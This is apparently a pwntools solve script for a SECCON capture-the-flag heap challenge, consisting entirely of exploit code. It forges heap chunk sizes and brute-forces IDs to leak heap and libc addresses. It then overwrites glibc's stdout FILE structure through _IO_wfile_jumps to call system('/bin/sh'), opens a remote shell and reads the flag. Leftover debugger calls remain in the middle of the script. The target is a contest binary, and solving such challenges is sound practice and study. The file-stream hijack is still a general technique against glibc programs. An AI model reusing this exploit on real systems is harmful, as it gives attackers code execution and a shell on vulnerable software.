#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env = {'LD_PRELOAD': './libc.so.6'})
else:
    s = remote('free3.seccon.games', 8215)

elf = ELF('./chall')
libc = ELF('./libc.so.6')

def alloc(size, should_remain=False):
    s.sendline(b'1')
    s.sendline(str(size).encode())
    s.recvuntil(b'ID:')
    id_ = int(s.recvuntil(b' ')[:-1], 0x10)
    if should_remain:
        return id_
    else:
        release(id_)

def edit(id_, data):
    s.sendline(b'2')
    s.sendline(str(id_).encode())
    s.recvuntil(b'id: ')
    length = None
    if s.recv(1) == b'd':
        s.recvuntil(b'(')
        length = int(s.recvuntil(b'): ')[:-3])
        s.send(data)
    return length

def release(id_):
    s.sendline(b'3')
    s.sendline(str(id_).encode())
    s.recvuntil(b'id: ')

alloc(0x400)
alloc(0x400)
alloc(0x400)
id_ = alloc(0x30, True)
edit(id_, b'A' * 0x28 + p64(0x101)[:-1])
release(id_)

for i in range(8):
    alloc(0x400)
    alloc(0x400)
    alloc(0x400)
    alloc(0x1d0)
    id_ = alloc(0xe0, True)
    edit(id_, b'A' * 0xd8 + p64(0x101)[:-1])
    release(id_)

gdb.attach(s)
pause()

alloc(0x400)
alloc(0xa0)
alloc(0x90)
alloc(0x20)

p = log.progress('leaking heap address')
heap_base = None
for i in list(range(0x500, 0x1000)) + list(range(0x500)):
    p.status(hex(i))
    id_ = 0x5000 + i
    length = edit(id_, b'\n')
    if length is not None:
        heap_base = (id_ << 32) + length - 0x10ffa0
        break
if heap_base is None:
    for i in range(0x1000):
        p.status(hex(i))
        id_ = 0x6000 + i
        length = edit(id_, b'\n')
        if length is not None:
            heap_base = (id_ << 32) + length - 0x10ffa0
            break
p.success(hex(heap_base))

p = log.progress('leaking libc address')
for i in range(0xfff, -1, -1):
    p.status(hex(i))
    id_ = 0x7000 + i
    length = edit(id_, b'\n')
    if length is not None:
        libc.address = (id_ << 32) + length - 0x203b30
        edit(id_, p64(libc.address + 0x203b40)[:-1] + b'\n')
        break

p.success(hex(libc.address))

id1 = alloc(0x100, True)
id2 = alloc(0x100, True)
alloc(0x30)

edit(id1, b'A' * 0xd8 + p64(0x41) + p64(libc.address + 0x203b50) * 2 + b'\n')

wide_data_addr = heap_base + 0x131548

payload = p64(0x40) + p64(0x20) + b'A' * 8 + p64(0x21)
# wide_data
payload += p64(0) * 2 + p64(1)
payload += p64(0) * 7
payload += p64(libc.symbols['system'])
payload += p64(0) * 14
payload += p64(wide_data_addr)
payload += b'\n'

edit(id2, payload)
edit((libc.address + 0x203b30) >> 32, (p64(heap_base + 0x131500) * 2)[:-1] + b'\n')

id3 = alloc(0x30, True)
edit(id3, b'A' * 8 + p64(0x111) + p64(libc.symbols['_IO_2_1_stdout_'] - 0x10) + b'\n')

payload = b'  /bin/sh'.ljust(0x10, b'\0')
payload += p64(0) * 3
payload += p64(wide_data_addr)
payload += p64(wide_data_addr + 1)
payload = payload.ljust(0x88, b'\0')
payload += p64(wide_data_addr + 0x100) # _lock
payload = payload.ljust(0xa0, b'\0')
payload += p64(wide_data_addr) # _wide_data
payload = payload.ljust(0xd8, b'\0')
payload += p64(libc.symbols['_IO_wfile_jumps'])
payload += b'\n'

edit(libc.symbols['_IO_2_1_stdout_'] >> 32, payload)

s.sendline(b'1')
s.sendline(b'1')

s.sendline(b'cat flag*')

s.interactive()
